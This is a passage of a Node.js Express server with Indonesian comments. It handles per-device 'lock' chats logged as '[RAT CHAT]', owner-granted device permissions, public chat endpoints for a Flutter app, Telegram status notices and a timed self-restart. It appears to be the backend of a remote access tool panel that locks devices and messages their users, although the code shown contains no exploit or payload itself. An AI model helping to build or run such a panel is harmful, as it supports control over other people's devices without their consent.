    if (!text) return res.status(400).json({ error: 'text required' });
    
    if (!lockChats[id]) lockChats[id] = [];
    const msg = { from: from || 'owner', text: text, time: new Date().toISOString().substring(11, 16) };
    lockChats[id].push(msg);
    if (lockChats[id].length > 200) lockChats[id] = lockChats[id].slice(-200);
    
    console.log(`[RAT CHAT] ${from || 'owner'} → ${id}: ${text}`);
    res.json({ status: 'sent' });
});

app.get('/api/lock-chat/:id', (req, res) => {
    const { id } = req.params;
    res.json({ messages: lockChats[id] || [] });
});

app.get('/api/lock-chat-all/:id', (req, res) => {
    const { id } = req.params;
    res.json({ messages: lockChats[id] || [] });
});

app.delete('/api/lock-chat/:id', (req, res) => {
    const { id } = req.params;
    lockChats[id] = [];
    res.json({ status: 'cleared' });
});

app.get("/devicePerms", (req, res) => {
    const { key, username } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    const perms = loadDevicePerms();
    const userPerm = perms[username?.toLowerCase()] || { approved: false, allDevices: false, devices: [] };
    res.json({ valid: true, ...userPerm });
});

app.post("/setDevicePerm", (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    const db = loadDatabase();
    const requester = db.find(u => u.username === keyInfo.username);
    if (!requester || requester.role !== 'owner') {
        return res.status(403).json({ valid: false, message: "Only owner can manage permissions" });
    }
    
    const { username, approved, allDevices, devices } = req.body;
    if (!username) return res.status(400).json({ valid: false, error: "Username required" });
    
    const perms = loadDevicePerms();
    perms[username.toLowerCase()] = {
        approved: approved === true || approved === 'true',
        allDevices: allDevices === true || allDevices === 'true',
        devices: Array.isArray(devices) ? devices : []
    };
    saveDevicePerms(perms);
    
    res.json({ valid: true, message: "Permission updated" });
});

app.get("/listDevicePerms", (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    const db = loadDatabase();
    const requester = db.find(u => u.username === keyInfo.username);
    if (!requester || requester.role !== 'owner') {
        return res.status(403).json({ valid: false });
    }
    
    const perms = loadDevicePerms();
    res.json({ valid: true, perms: perms });
});

// ============ PUBLIC CHAT ENDPOINTS (UNTUK FLUTTER APP) ============
// TAMBAHKAN INI DI SINI

// GET /getPublicChat - Ambil pesan public chat
app.get("/getPublicChat", (req, res) => {
    const { key, lastId } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false });
    
    let messages = loadChatMessages();
    
    // Filter pesan lebih baru dari lastId
    if (lastId) {
        const lastIdInt = parseInt(lastId);
        messages = messages.filter(m => parseInt(m.id) > lastIdInt);
    }
    
    // Balik urutan karena Flutter pake insert(0)
    const reversedMessages = [...messages].reverse();
    
    // Format ulang ke format yang dimengerti Flutter
    const formattedMessages = reversedMessages.map(m => ({
        id: m.id,
        username: m.username,
        role: m.role || 'member',
        message: m.message,
        timestamp: m.timestamp,
        formattedTime: m.formattedTime || new Date(m.timestamp).toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' })
    }));
    
    res.json({
        valid: true,
        messages: formattedMessages
    });
});

// POST /sendPublicChat - Kirim pesan public chat
app.post("/sendPublicChat", (req, res) => {
    const { key, message } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false });
    
    // SANITASI MESSAGE
    const rawMessage = message || '';
    const sanitizedMessage = sanitizeMessage(rawMessage);
    
    if (!sanitizedMessage || sanitizedMessage.length === 0) {
        return res.json({ valid: false, message: "Message cannot be empty or invalid" });
    }
    
    if (sanitizedMessage.length > 500) {
        return res.json({ valid: false, message: "Message too long (max 500 chars)" });
    }
    
    // TAMBAHKAN COOLDOWN
    const username = keyInfo.username;
    const lastMessageTime = userMessageCooldown.get(username);
    const now = Date.now();
    
    if (lastMessageTime && (now - lastMessageTime) < MESSAGE_COOLDOWN_MS) {
        const waitTime = Math.ceil((MESSAGE_COOLDOWN_MS - (now - lastMessageTime)) / 1000);
        return res.json({ 
            valid: false, 
            message: `Please wait ${waitTime} seconds between messages`,
            cooldown: true 
        });
    }
    
    userMessageCooldown.set(username, now);
    // Hapus cooldown setelah 5 detik
    setTimeout(() => {
        if (userMessageCooldown.get(username) === now) {
            userMessageCooldown.delete(username);
        }
    }, MESSAGE_COOLDOWN_MS);
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    
    const messages = loadChatMessages();
    const newMessage = {
        id: Date.now().toString(),
        username: keyInfo.username,
        role: user?.role || 'member',
        message: sanitizedMessage,  // PAKAI YANG SUDAH DISANITASI
        timestamp: new Date().toISOString(),
        formattedTime: new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' })
    };
    
    messages.push(newMessage);
    saveChatMessages(messages);
    
    broadcastToChatClients({ 
        type: 'new_message', 
        message: newMessage 
    });
    
    res.json({ 
        valid: true, 
        message: newMessage 
    });
});

// DELETE /deletePublicChat - Hapus pesan public chat
app.delete("/deletePublicChat", (req, res) => {
    const { key, messageId } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false });
    
    // VALIDASI messageId format
    if (!messageId || !/^\d+$/.test(messageId) || messageId.length < 13) {
        return res.json({ valid: false, message: "Invalid message ID format" });
    }
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    
    let messages = loadChatMessages();
    const targetMsg = messages.find(m => m.id === messageId);
    
    if (!targetMsg) {
        return res.json({ valid: false, message: "Message not found" });
    }
    
    // Cek permission: hanya owner atau pembuat pesan yang bisa hapus
    if (user?.role !== 'owner' && targetMsg.username !== keyInfo.username) {
        return res.json({ valid: false, message: "Cannot delete other's message" });
    }
    
    messages = messages.filter(m => m.id !== messageId);
    saveChatMessages(messages);
    
    broadcastToChatClients({ 
        type: 'delete_message', 
        messageId: messageId 
    });
    
    // LOG untuk audit
    console.log(`[DELETE] User ${keyInfo.username} (role: ${user?.role}) deleted message ${messageId} from ${targetMsg.username}`);
    
    res.json({ valid: true });
});

// GET /getOnlineUsers - Ambil user online di public chat
app.get("/getOnlineUsers", (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false });
    
    const onlineUsers = loadOnlineUsers();
    const activeNow = onlineUsers.filter(u => {
        const lastActive = new Date(u.lastActive);
        return (Date.now() - lastActive) < 60000;
    });
    
    res.json({
        valid: true,
        count: activeNow.length,
        users: activeNow
    });
});

app.listen(PORT, async () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
  await startUserSessions();
  await connectGlobalSenders();
});

const RESTART_INTERVAL = 20 * 60 * 1000;

function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(`🟣 *Status Panel:*\n${pesan}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

kirimStatusServer("✅ Server aktif dan berjalan normal.");

setInterval(() => {
  kirimStatusServer("♻️ Panel akan *restart otomatis* untuk menjaga kestabilan...");
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0);
  }, 5000);
}, RESTART_INTERVAL);